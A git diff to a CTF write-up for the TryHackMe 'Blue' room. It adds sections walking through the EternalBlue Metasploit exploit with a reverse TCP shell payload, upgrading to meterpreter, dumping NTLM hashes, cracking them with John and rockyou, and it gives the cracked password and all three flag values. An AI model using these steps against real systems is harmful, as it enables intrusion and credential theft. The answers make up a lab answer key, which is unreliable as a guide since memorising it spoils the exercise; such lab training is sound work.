@@ -3,6 +3,9 @@
 - [Tools](#tools)
 - [Recon](#recon)
 - [Gain Access](#gain-access)
+- [Escalate](#escalate)
+- [Cracking](#cracking)
+- [Find flags](#find-flags)
 
 Room Link: https://tryhackme.com/room/blue
 
@@ -73,9 +76,11 @@ Interact with a module by name or index. For example info 4, use 4 or use exploi
 4. To use the exploit we typed `use exploit/windows/smb/ms17_010_eternalblue` command
 5. After checkinh options with `options` command, we found that we need to add rhosts with `set rhosts 10.10.248.180` and `set lhost tun0` command
 6. Question `Show options and set the one required value. What is the name of this value? (All caps for submission)` Answer `RHOSTS`
-7. Used payload with command `set payload windows/x64/shell/reverse_tcp`
-8. Then `run` and wait for some time.
-9. `search shell_to_meterpreter` to find module to upgrade session to meterpreter.
+
+## Escalate 
+1. Used payload with command `set payload windows/x64/shell/reverse_tcp`
+2. Then `run` and wait for some time.
+3. `search shell_to_meterpreter` to find module to upgrade session to meterpreter.
 Output:
 ```bash
 Matching Modules
@@ -88,9 +93,9 @@ Matching Modules
 
 Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
 ```
-10. Question `If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)` Answer `post/multi/manage/shell_to_meterpreter`
-11. Question `Select this (use MODULE_PATH). Show options, what option are we required to change?` Answer `SESSION`
-12. Run the module after setting session. If fails run it again, it will connect.
+4. Question `If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)` Answer `post/multi/manage/shell_to_meterpreter`
+5. Question `Select this (use MODULE_PATH). Show options, what option are we required to change?` Answer `SESSION`
+6. Run the module after setting session. If fails run it again, it will connect.
 ```bash
 meterpreter > shell
 Process 808 created.
@@ -122,8 +127,10 @@ Process List
 ...............................................................................
 ...............................................................................
 ```
-13. Use `migrate PROCESS_ID` to mmigrate.
-14. Use `hashdump` to hashes.
+7. Use `migrate PROCESS_ID` to mmigrate.
+
+## Cracking
+1. Use `hashdump` to hashes.
 Output:
 ```bash
 meterpreter > hashdump
@@ -131,8 +138,64 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 ```
-16. Question `Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?` Answer `Jon`
-17. Save hashes in a file named `hash.txt` and use `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` to crack the hash.
-18. 
+2. Question `Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?` Answer `Jon`
+3. Save hashes in a file named `hash.txt` and use `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` to crack the hash.
+4. Question `Copy this password hash to a file and research how to crack it. What is the cracked password?` Answer `alqfna22`
+
+## Find flags
+1. We can goto `C:\\` abd get first flag using `cat flag1.txt`.
+```bash
+meterpreter > pwd
+C:\Windows\system32
+meterpreter > cd C:\\
+meterpreter > ls
+Listing: C:\
+============
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+040777/rwxrwxrwx  0      dir   2018-12-13 08:43:36 +0530  $Recycle.Bin
+040777/rwxrwxrwx  0      dir   2009-07-14 10:38:56 +0530  Documents and Settings
+040777/rwxrwxrwx  0      dir   2009-07-14 08:50:08 +0530  PerfLogs
+040555/r-xr-xr-x  4096   dir   2019-03-18 03:52:01 +0530  Program Files
+040555/r-xr-xr-x  4096   dir   2019-03-18 03:58:38 +0530  Program Files (x86)
+040777/rwxrwxrwx  4096   dir   2019-03-18 04:05:57 +0530  ProgramData
+040777/rwxrwxrwx  0      dir   2018-12-13 08:43:22 +0530  Recovery
+040777/rwxrwxrwx  4096   dir   2019-03-18 04:05:55 +0530  System Volume Information
+040555/r-xr-xr-x  4096   dir   2018-12-13 08:43:28 +0530  Users
+040777/rwxrwxrwx  16384  dir   2019-03-18 04:06:30 +0530  Windows
+100666/rw-rw-rw-  24     fil   2019-03-18 00:57:21 +0530  flag1.txt
+000000/---------  0      fif   1970-01-01 05:30:00 +0530  hiberfil.sys
+000000/---------  0      fif   1970-01-01 05:30:00 +0530  pagefile.sys
+
+meterpreter > cat flag1.txt
+flag{access_the_machine}
+```
+2. We can use `search -f flag2.txt` and `search -f flag2.txt` to find second and third flag to submit, as we already know the first one.
+```bash
+meterpreter > search -f flag2.txt
+Found 1 result...
+=================
+
+Path                                  Size (bytes)  Modified (UTC)
+----                                  ------------  --------------
+c:\Windows\System32\config\flag2.txt  34            2019-03-18 01:02:48 +0530
+
+meterpreter > cat c:\Windows\System32\config\flag2.txt
+[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
+meterpreter > cat "c:\Windows\System32\config\flag2.txt"
+flag{sam_database_elevated_access}
+meterpreter > search -f flag3.txt
+Found 1 result...
+=================
+
+Path                              Size (bytes)  Modified (UTC)
+----                              ------------  --------------
+c:\Users\Jon\Documents\flag3.txt  37            2019-03-18 00:56:36 +0530
+
+meterpreter > cat "c:\Users\Jon\Documents\flag3.txt"
+flag{admin_documents_can_be_valuable}
+```
+3. flag1 : `flag{access_the_machine}` flag2: `flag{sam_database_elevated_access}` flag3:`flag{admin_documents_can_be_valuable}`
 
 Author: Zishan Ahamed Thandar
